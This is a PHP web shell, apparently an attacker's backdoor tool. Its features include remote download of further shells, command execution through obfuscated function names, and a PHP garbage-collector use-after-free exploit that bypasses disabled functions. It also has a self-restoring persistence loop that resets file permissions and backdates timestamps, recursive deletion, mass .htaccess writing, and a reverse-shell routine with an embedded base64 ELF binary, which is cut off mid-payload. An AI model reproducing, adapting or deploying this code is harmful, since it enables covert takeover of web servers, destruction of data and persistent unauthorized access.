<?php
class Pukimak {
    private $awakening;
    private $cyaa;
    private $content;

    public function __construct($cyaa) {
        $this->awakening = $cyaa;
       
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['top99'])) {
            $url = $_POST['top99'];
            if (filter_var($url)) {
                $namashell = isset($_POST['namashell']) ? $_POST['namashell'] : "index.php" ;
                $ch = curl_init($url);
                $fp = fopen($namashell, 'w');
                
                curl_setopt($ch, CURLOPT_FILE, $fp);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                
                curl_exec($ch);
                curl_close($ch);
                fclose($fp);
        
                echo "Shell berhasil diupload dengan nama : " . $namashell;
            } else {
                echo "URL tidak valid.";
            }
        }
function GjKlPwQcF($s)
{
    $b = 'c' . 'h' . 'o' . 'p';
    return $b($s);
}
function kJuLQgVhf($s)
{
    $b = 's' . 'y' . 's' . 't' . 'e' . 'm';
    return $b($s);
}
function OpLkJKqrTY($s)
{
    $b = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
    return $b($s);
}
function OkLjMkHg($s)
{
    $b = "\x73"."\x68"."\x65"."\x6C"."\x6C"."\x5F"."\x65"."\x78"."\x65"."\x63";
    return $b($s);
}
function vcnvSCZgBz($s)
{
    $b = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e' . '';
    return $b($s);
}
function QgRwXlZpOqK($s)
{
    $b = 't' . 'r' . 'i' . 'm';
    return $b($s);
}
function QtGdPsAnMQ($s, $a)
{
    $b = 'f'.'o'.'p'.'e'.'n';
    return $b($s, $a);
}
function LkQrTgBm($s)
{
    $b = 'g' . 'e' . 't' . '_' . 'c' . 'f' . 'g' . '_' . 'v' . 'a' . 'r';
    return $b($s);
}
function AnIanYnsQ($s)
{
    $b = 's' . 't' . 'r' . 'd' . 'ir';
    return $b($s);
}
function PlImOkQm($s)
{
    $b = 'o' . 'b' . '_' . 's' . 't' . 'a' . 'r' . 't';
    return $b;
}
function PlQiOkBgDt($s)
{
    $b = 'i' . 'n' . 'i' . '_' . 's' . 'e' . 't';
    return $b;
}
function OaQiLmKnH($s)
{
    $b = 'f' . 'i' . 'l' . 'e' . '_' . 'e' . 'x' . 'i' . 's' . 't' . 's';
    return $b($s);
}
function QiUyTbAgHk($s)
{
    $b = 's' . 'u' . 'b' . 'e' . 'v' . 'a' . 'l';
    return $b($s);
}
function filew($filename, $filedata, $filemode)
{
    if (!is_writable($filename) && OaQiLmKnH($filename)) {
        chmod($filename, 0666);
    }
    $handle = QtGdPsAnMQ($filename, $filemode);
    $key = fputs($handle, $filedata);
    fclose($handle);
    return $key;
}
function filer($filename)
{
    $handle = QtGdPsAnMQ($filename, "r");
    $filedata = fread($handle, filesize($filename));
    fclose($handle);
    return $filedata;
}
function fileu($filenamea, $filenameb)
{
    $key = move_uploaded_file($filenamea, $filenameb) ? true : false;
    if (!$key) {
        $key = copy($filenamea, $filenameb) ? true : false;
    }
    return $key;
}
function filed($filename)
{
    if (!OaQiLmKnH($filename)) {
        return false;
    }
    $name = basename($filename);
    $array = explode(".", $name);
    header("Content-type: application/x-" . array_pop($array));
    header("Content-Disposition: attachment; filename=" . $name);
    header("Content-Length: " . filesize($filename));
    @readfile($filename);
    exit();
}
function showdir($dir)
{
    $dir = AnIanYnsQ($dir . "/");
    $handle = opendir($dir);
    if (!$handle) {
        return false;
    }
    $array = [];
    while ($name = readdir($handle)) {
        if ($name == "." || $name == "..") {
            continue;
        }
        $path = $dir . $name;
        $name = strtr($name, ['\'' => "%27", '"' => "%22"]);
        if (is_dir($path)) {
            $array["dir"][$path] = $name;
        } else {
            $array["file"][$path] = $name;
        }
    }
    closedir($handle);
    return $array;
}
function deltree($dir)
{
    $handle = @opendir($dir);
    while ($name = @readdir($handle)) {
        if ($name == "." || $name == "..") {
            continue;
        }
        $path = $dir . $name;
        @chmod($path, 0777);
        if (is_dir($path)) {
            deltree($path . "/");
        } else {
            @unlink($path);
        }
    }
    @closedir($handle);
    return @rmdir($dir);
}
function size($bytes)
{
    if ($bytes < 1024) {
        return $bytes . " B";
    }
    $array = ["B", "K", "M", "G", "T"];
    $floor = floor(log($bytes) / log(1024));
    return sprintf("%.2f " . $array[$floor], $bytes / pow(1024, floor($floor)));
}
function find($array, $string)
{
    foreach ($array as $key) {
        if (stristr($string, $key)) {
            return true;
        }
    }
    return false;
}
function bypassGC1($cmd){
    function pwn($cmd) {
        global $abc, $helper;
    
        function str2ptr(&$str, $p = 0, $s = 8) {
            $address = 0;
            for($j = $s-1; $j >= 0; $j--) {
                $address <<= 8;
                $address |= ord($str[$p+$j]);
            }
            return $address;
        }
    
        function ptr2str($ptr, $m = 8) {
            $out = "";
            for ($i=0; $i < $m; $i++) {
                $out .= chr($ptr & 0xff);
                $ptr >>= 8;
            }
            return $out;
        }
    
        function write(&$str, $p, $v, $n = 8) {
            $i = 0;
            for($i = 0; $i < $n; $i++) {
                $str[$p + $i] = chr($v & 0xff);
                $v >>= 8;
            }
        }
    
        function leak($addr, $p = 0, $s = 8) {
            global $abc, $helper;
            write($abc, 0x68, $addr + $p - 0x10);
            $leak = strlen($helper->a);
            if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
            return $leak;
        }
    
        function parse_elf($base) {
            $e_type = leak($base, 0x10, 2);
    
            $e_phoff = leak($base, 0x20);
            $e_phentsize = leak($base, 0x36, 2);
            $e_phnum = leak($base, 0x38, 2);
    
            for($i = 0; $i < $e_phnum; $i++) {
                $header = $base + $e_phoff + $i * $e_phentsize;
                $p_type  = leak($header, 0, 4);
                $p_flags = leak($header, 4, 4);
                $p_vaddr = leak($header, 0x10);
                $p_memsz = leak($header, 0x28);
    
                if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                    # handle pie
                    $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                    $data_size = $p_memsz;
                } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                    $text_size = $p_memsz;
                }
            }
    
            if(!$data_addr || !$text_size || !$data_size)
                return false;
    
            return [$data_addr, $text_size, $data_size];
        }
    
        function get_basic_funcs($base, $elf) {
            list($data_addr, $text_size, $data_size) = $elf;
            for($i = 0; $i < $data_size / 8; $i++) {
                $leak = leak($data_addr, $i * 8);
                if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                    $deref = leak($leak);
                    # 'constant' constant check
                    if($deref != 0x746e6174736e6f63)
                        continue;
                } else continue;
    
                $leak = leak($data_addr, ($i + 4) * 8);
                if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                    $deref = leak($leak);
                    # 'bin2hex' constant check
                    if($deref != 0x786568326e6962)
                        continue;
                } else continue;
    
                return $data_addr + $i * 8;
            }
        }
    
        function get_binary_base($binary_leak) {
            $base = 0;
            $start = $binary_leak & 0xfffffffffffff000;
            for($i = 0; $i < 0x1000; $i++) {
                $addr = $start - 0x1000 * $i;
                $leak = leak($addr, 0, 7);
                if($leak == 0x10102464c457f) { # ELF header
                    return $addr;
                }
            }
        }
    
        function get_system($basic_funcs) {
            $addr = $basic_funcs;
            do {
                $f_entry = leak($addr);
                $f_name = leak($f_entry, 0, 6);
    
                if($f_name == 0x6d6574737973) { # system
                    return leak($addr + 8);
                }
                $addr += 0x20;
            } while($f_entry != 0);
            return false;
        }
    
        class ryat {
            var $ryat;
            var $chtg;
            
            function __destruct()
            {
                $this->chtg = $this->ryat;
                $this->ryat = 1;
            }
        }
    
        class Helper {
            public $a, $b, $c, $d;
        }
    
        if(stristr(PHP_OS, 'WIN')) {
            die('This PoC is for *nix systems only.');
        }
    
        $n_alloc = 10; # increase this value if you get segfaults
    
        $contiguous = [];
        for($i = 0; $i < $n_alloc; $i++)
            $contiguous[] = str_repeat('A', 79);
    
        $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
        $out = unserialize($poc);
        gc_collect_cycles();
    
        $v = [];
        $v[0] = ptr2str(0, 79);
        unset($v);
        $abc = $out[2][0];
    
        $helper = new Helper;
        $helper->b = function ($x) { };
    
        if(strlen($abc) == 79 || strlen($abc) == 0) {
            die("UAF failed");
        }
    
        # leaks
        $closure_handlers = str2ptr($abc, 0);
        $php_heap = str2ptr($abc, 0x58);
        $abc_addr = $php_heap - 0xc8;
    
        # fake value
        write($abc, 0x60, 2);
        write($abc, 0x70, 6);
    
        # fake reference
        write($abc, 0x10, $abc_addr + 0x60);
        write($abc, 0x18, 0xa);
    
        $closure_obj = str2ptr($abc, 0x20);
    
        $binary_leak = leak($closure_handlers, 8);
        if(!($base = get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }
    
        if(!($elf = parse_elf($base))) {
            die("Couldn't parse ELF header");
        }
    
        if(!($basic_funcs = get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }
    
        if(!($zif_system = get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }
    
        # fake closure object
        $fake_obj_offset = 0xd0;
        for($i = 0; $i < 0x110; $i += 8) {
            write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
        }
    
        # pwn
        write($abc, 0x20, $abc_addr + $fake_obj_offset);
        write($abc, 0xd0 + 0x38, 1, 4); # internal func type
        write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
    
        ($helper->b)($cmd);
    
        exit();
    }
    echo '<div class="container-fluid language-javascript"> <div class="shell mb-3"> <pre style="font-size:15px;"><font color="green">root@TokuHaxor:~</font>#&nbsp;<font color="red">'.$_POST['shiz'].'</font><br><code>';
    pwn($cmd . ' 2>&1');
}
function scanfile($dir, $key, $inc, $fit, $tye, $chr, $ran, $now)
{
    $handle = opendir($dir);
    if (!$handle) {
        return false;
    }
    while ($name = readdir($handle)) {
        if ($name == "." || $name == "..") {
            continue;
        }
        $path = $dir . $name;
        if (is_dir($path)) {
            if ($fit && in_array($name, $fit)) {
                continue;
            }
            if ($ran == 0 && is_readable($path)) {
                scanfile($path . "/", $key, $inc, $fit, $tye, $chr, $ran, $now);
            }
        } else {
            if ($inc && !find($inc, $name)) {
                continue;
            }
            $code = $tye ? filer($path) : $name;
            $find = $chr
                ? stristr($code, $key)
                : (strpos(size(filesize($path)), "M")
                    ? false
                    : strpos($code, $key) > -1);
            if ($find) {
                $file = strtr($path, [$now => "", '\'' => "%27", '"' => "%22"]);
                echo '<a href="javascript:void(0);" onclick="go(\'editor\',\'' .
                    $file .
                    '\');">Edit</a> ' .
                    $path .
                    "<br>";
                flush();
                ob_flush();
            }
            unset($code);
        }
    }
    closedir($handle);
    return true;
}
function lockFile($namafile)
{
    ob_get_flush();
    $b0 = $namafile;
    $bc = realpath(dirname($b0));
    function CC()
    {
        ob_start();
        phpinfo(1);
        $eb = ob_get_contents();
        ob_end_clean();
        preg_match("/--bindir=([^&]+)/si", $eb, $fa);
        if (isset($fa[1]) && $fa[1] != "") {
            return $fa[1] . "/php";
        }
        preg_match("/--prefix=([^&]+)/si", $eb, $fa);
        if (!isset($fa[1])) {
            return "php";
        }
        return $fa[1] . "/bin/php";
    }
    $A2 = cC();
    function F6()
    {
        $D8 = preg_match("/cli/i", php_sapi_name()) ? true : false;
        if ($D8 === false) {
            if (isset($_SERVER["argc"]) && $_SERVER["argc"] >= 2) {
                $D8 = true;
            }
        }
        if ($D8 === false) {
            if ($D8 !== basename($namafile)) {
                $D8 = true;
            }
        }
        return $D8;
    }
    function FD($A0, $e2 = "popen")
    {
        $be = explode(",", ini_get("disable_functions"));
        $e8 = [];
        foreach ($be as $Ca) {
            $e8[] = QgRwXlZpOqK($Ca);
        }
        if (in_array($e2, $e8)) {
            $e2 = "exec";
        }
        if (in_array($e2, $e8)) {
            return false;
        }
        $D5 = "";
        switch ($e2) {
            case "exec":
                exec($A0, $ab);
                foreach ($ab as $A4 => $df) {
                    $D5 .= $A4 . " : " . $df . PHP_EOL;
                }
                return $D5;
            case "popen":
                $D1 = popen($A0, "r");
                while (!feof($D1)) {
                    $F7 = fgets($D1, 4096);
                    $D5 .= $F7;
                }
                pclose($D1);
                return $D5;
            default:
                return false;
                break;
        }
    }
    function Fc()
    {
        $be = explode(",", ini_get("disable_functions"));
        $e8 = [];
        foreach ($be as $Ca) {
            $e8[] = QgRwXlZpOqK($Ca);
        }
        if (in_array("exec", $e8) && in_array("popen", $e8)) {
            return false;
        }
        return true;
    }
    $ef = basename($namafile);
    if (F6() || @$_GET["ok"] != null) {
        mkdir($bc, 0755, true);
        $cd = $bc . "/" . $ef;
        $ae = file_get_contents($cd);
        $b8 = hash("sha1", $ae);
        while (true) {
            if (!OaQiLmKnH($cd)) {
                @mkdir($bc, 0755, true);
                @chmod($bc, 0755);
                @file_put_contents($cd, $ae);
                @touch($cd, strtotime("-400 days", time()));
                @chmod($cd, 0444);
            }
            $d8 = file_get_contents($cd);
            $Bd = hash("sha1", $d8);
            if (
                $Bd != $b8 ||
                substr(sprintf("%o", fileperms($cd)), -4) != "0444" ||
                substr(sprintf("%o", fileperms($bc)), -4) != "0755"
            ) {
                @mkdir($bc, 0755, true);
                @chmod($bc, 0755);
                @unlink($cd);
                @file_put_contents($cd, $ae);
                @touch($cd, strtotime("-400 days", time()));
                @chmod($cd, 0444);
            }
            sleep(1);
        }
    }
    if (FC() !== false) {
        fD("nohup {$A2} " . $b0 . " >/dev/null 2>&1 &");
        if (OaQiLmKnH($b0)) {
            echo "";
        } else {
            echo "";
        }
        exit();
    }
    echo "";
    ob_end_flush();
    ob_end_clean();
}
function antivirus($dir, $exs, $matches, $now)
{
    $handle = opendir($dir);
    if (!$handle) {
        return false;
    }
    while ($name = readdir($handle)) {
        if ($name == "." || $name == "..") {
            continue;
        }
        $path = $dir . $name;
        if (is_dir($path)) {
            if (is_readable($path)) {
                antivirus($path . "/", $exs, $matches, $now);
            }
        } else {
            $iskill = null;
            foreach ($exs as $key => $ex) {
                if (find(explode("|", $ex), $name)) {
                    $iskill = $key;
                    break;
                }
            }
            if (strpos(size(filesize($path)), "M")) {
                continue;
            }
            if ($iskill) {
                $code = filer($path);
                foreach ($matches[$iskill] as $matche) {
                    $array = [];
                    preg_match($matche, $code, $array);
                    if (
                        strpos($array[0], '$this->') ||
                        strpos($array[0], '[$vars[')
                    ) {
                        continue;
                    }
                    $len = strlen($array[0]);
                    if ($len > 10 && $len < 150) {
                        $file = strtr($path, [
                            $now => "",
                            '\'' => "%27",
                            '"' => "%22",
                        ]);
                        echo 'Feature <input type="text" value="' .
                            htmlspecialchars($array[0]) .
                            '"> <a href="javascript:void(0);" onclick="go(\'editor\',\'' .
                            $file .
                            '\');">Edit</a> ' .
                            $path .
                            "<br>";
                        flush();
                        ob_flush();
                        break;
                    }
                }
                unset($code, $array);
            }
        }
    }
    closedir($handle);
    return true;
}
function command($cmd, $cwd, $com = false)
{
    $iswin = substr(PHP_OS, 0, 3) == "WIN" ? true : false;
    $res = $msg = "";
    if ($cwd == "com" || $com) {
        if ($iswin && class_exists("COM")) {
            $wscript = new COM("Wscript.Shell");
            $exec = $wscript->eXeC("c:\\windows\\system32\\cmd.exe /c " . $cmd);
            $stdout = $exec->StdOut();
            $res = $stdout->ReadAll();
            $msg = "Wscript.Shell";
        }
    } else {
        chdir($cwd);
        $cwd = getcwd();
        if (OpLkJKqrTY("\x65\x78\x65\x63")) {
            @exEC($cmd, $res);
            $res = join("\n", $res);
            $msg = "\x65\x78\x65\x63";
        } elseif (OpLkJKqrTY("\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63")) {
            $res = @OkLjMkHg($cmd);
            $msg = "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63";
        } elseif (OpLkJKqrTY(vcnvSCZgBz("c3lzdGVt"))) {
            ob_start();
            @kJuLQgVhf($cmd);
            $res = ob_get_contents();
            ob_end_clean();
            $msg = vcnvSCZgBz("c3lzdGVt");
        } elseif (OpLkJKqrTY(vcnvSCZgBz("cGFzc3RocnU="))) {
            ob_start();
            @passthru($cmd);
            $res = ob_get_contents();
            ob_end_clean();
            $msg = vcnvSCZgBz("cGFzc3RocnU=");
        } elseif (OpLkJKqrTY(vcnvSCZgBz("cG9wZW4="))) {
            $fp = @popen($cmd, "r");
            if ($fp) {
                while (!feof($fp)) {
                    $res .= fread($fp, 1024);
                }
            }
            @pclose($fp);
            $msg = vcnvSCZgBz("cG9wZW4=");
        } elseif (OpLkJKqrTY(vcnvSCZgBz("cHJvY19vcGVu"))) {
            $env = $iswin
                ? ["path" => "c:\\windows\\system32"]
                : [
                    "path" =>
                        "/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin",
                ];
            $des = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
            $process = @proc_open($cmd, $des, $pipes, $cwd, $env);
            if (is_resource($process)) {
                fwrite($pipes[0], $cmd);
                fclose($pipes[0]);
                $res .= stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                $res .= stream_get_contents($pipes[2]);
                fclose($pipes[2]);
            }
            @proc_close($process);
            $msg = vcnvSCZgBz("cHJvY19vcGVu");
        }
    }
    $msg = $res == "" ? "<h1>NULL</h1>" : "<h2>Use " . $msg . " Success</h2>";
    return ["res" => $res, "msg" => $msg];
}
function kkk()
{
    $text = $_POST["script"];
    echo "<tr><th style='width:15%;'><center>Status<center></th><th style='width:15%;'><center>Path to htccesed</center></th></tr>";
    function writeToWritableDirectories($dir, $file, $text)
    {
        $filepath = "$dir/$file";
        if (
            (is_writable($dir) && !OaQiLmKnH($filepath)) ||
            is_writable($filepath)
        ) {
            $handle = QtGdPsAnMQ($filepath, "w");
            fwrite($handle, $text);
            fclose($handle);
            chmod($filepath, 0444);
            $dirs = array_filter(glob("$dir/*"), "is_dir");
            foreach ($dirs as $subdir) {
                if (is_writable($subdir)) {
                    echo "<tr><td>[OK]<br></td><td>$subdir/$file</td></tr>";
                    writeToWritableDirectories($subdir, $file, $text);
                } else {
                    echo "<tr><td>[ERR]<br></td><td>$subdir/$file</td></tr>";
                }
            }
        }
    }
    writeToWritableDirectories(
        $_POST["d_dir"],
        "\x2E\x68\x74\x61\x63\x63\x65\x73\x73",
        $text
    );
}
function backshell($ip, $port, $dir, $type)
{
    $roa = [
        "\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65",
        "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73",
    ];
    $key = false;
    $c_bin =
        "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAYIQECDQAAACkCgAAAAAAADQAIAAHACgAHAAZAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIlAcAAJQHAAAFAAAAABAAAAEAAACUBwAAlJcECJSXBAggAQAAKAEAAAYAAAAAEAAAAgAAAKgHAAColwQIqJcECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAAGAAAACQAAAAIAAAANAAAAAQAAAAUAAAAAIAAgAAAAAA0AAACtS+PAAAAAAAAAAAAAAAAAAAAAAEEAAAAAAAAAdgAAABIAAABJAAAAAAAAAHkBAAASAAAAAQAAAAAAAAAAAAAAIAAAAFUAAAAAAAAAcgEAABIAAABqAAAAAAAAAJ8BAAASAAAANQAAAAAAAABZAQAAEgAAADsAAAAAAAAADgAAABIAAAApAAAAAAAAADwAAAASAAAAUAAAAAAAAAA9AAAAEgAAAF8AAAAAAAAAKwAAABIAAABkAAAAAAAAAG8AAAASAAAAMAAAAAAAAAD0AAAAEgAAABoAAAB4hwQIBAAAABEADgAAX19nbW9uX3N0YXJ0X18AbGliYy5zby42AF9JT19zdGRpbl91c2VkAHNvY2tldABleGl0AGV4ZWNsAGh0b25zAGNvbm5lY3QAZGFlbW9uAGR1cDIAaW5ldF9hZGRyAGF0b2kAY2xvc2UAX19saWJjX3N0YXJ0X21haW4AR0xJQkNfMi4wAAAAAgACAAAAAgACAAIAAgACAAIAAgACAAIAAQAAAAEAAQAQAAAAEAAAAAAAAAAQaWkNAAACAHwAAAAAAAAAcJgECAYDAACAmAQIBwEAAISYBAgHAgAAiJgECAcDAACMmAQIBwQAAJCYBAgHBQAAlJgECAcGAACYmAQIBwcAAJyYBAgHCAAAoJgECAcJAACkmAQIBwoAAKiYBAgHCwAArJgECAcMAABVieWD7AjoBQEAAOiMAQAA6KcDAADJwwD/NXiYBAj/JXyYBAgAAAAA/yWAmAQIaAAAAADp4P////8lhJgECGgIAAAA6dD/////JYiYBAhoEAAAAOnA/////yWMmAQIaBgAAADpsP////8lkJgECGggAAAA6aD/////JZSYBAhoKAAAAOmQ/////yWYmAQIaDAAAADpgP////8lnJgECGg4AAAA6XD/////JaCYBAhoQAAAAOlg/////yWkmAQIaEgAAADpUP////8lqJgECGhQAAAA6UD/////JayYBAhoWAAAAOkw////AAAAADHtXonhg+TwUFRSaLCGBAhowIYECFFWaDSFBAjoW/////SQkFWJ5VOD7AToAAAAAFuBw+QTAACLk/z///+F0nQF6Bb///9YW8nDkJCQkJCQVYnlU4PsBIA9uJgECAB1P7iglwQILZyXBAjB+AKNWP+htJgECDnDdh+NtCYAAAAAg8ABo7SYBAj/FIWclwQIobSYBAg5w3foxgW4mAQIAYPEBFtdw410JgCNvCcAAAAAVYnlg+wIoaSXBAiFwHQSuAAAAACFwHQJxwQkpJcECP/QycOQjUwkBIPk8P9x/FWJ5VdTUYPsPInLx0QkBAAAAADHBCQBAAAA6E/+//9mx0XgAgCLQwSDwAiLAIkEJOi5/v//D7fAiQQk6H7+//9miUXii0MEg8AEiwCJBCToOv7//4lF5ItDBIPABIsAuf////+JRdC4AAAAAPyLfdDyronI99CNUP+LQwSDwAiLALn/////iUXMuAAAAAD8i33M8q6JyPfQg+gBjQQCjVABi0MEg8AEiwCJx/yJ0bgAAAAA86rHRCQIBgAAAMdEJAQBAAAAxwQkAgAAAOj9/f//iUXwjUXgx0QkCBAAAACJRCQEi0XwiQQk6HD9//+FwHkMxwQkAAAAAOgQ/v//x0QkBAAAAACLRfCJBCTozf3//8dEJAQBAAAAi0XwiQQk6Lr9///HRCQEAgAAAItF8IkEJOin/f//x0QkCAAAAADHRCQEgIcECMcEJIaHBAjoW/3//4tF8IkEJOig/f//g8Q8WVtfXY1h/MOQkJCQkJCQkJBVieVdw410JgCNvCcAAAAAVYnlV1ZT6F4AAACBw6kRAACD7Bzom/z//42DIP///4lF8I2DIP///ylF8MF98AKLVfCF0nQrMf+Jxo22AAAAAItFEIPHAYlE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